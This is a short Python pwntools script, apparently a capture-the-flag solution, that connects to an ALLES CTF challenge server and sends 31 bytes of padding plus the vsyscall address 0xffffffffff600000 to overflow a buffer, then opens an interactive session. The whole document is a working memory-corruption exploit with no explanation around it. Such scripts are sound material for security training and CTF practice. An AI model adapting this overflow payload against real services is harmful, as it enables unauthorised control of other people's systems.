from pwn import *
elf = ELF("./test")

# p = elf.process()
p = remote("7b000000a8c3acb6af92129b-ccanary.challenge.master.allesctf.net", 31337,ssl=True)
p.sendlineafter(b"quote> ",(b"a"*31+p64(0xffffffffff600000)))
p.interactive()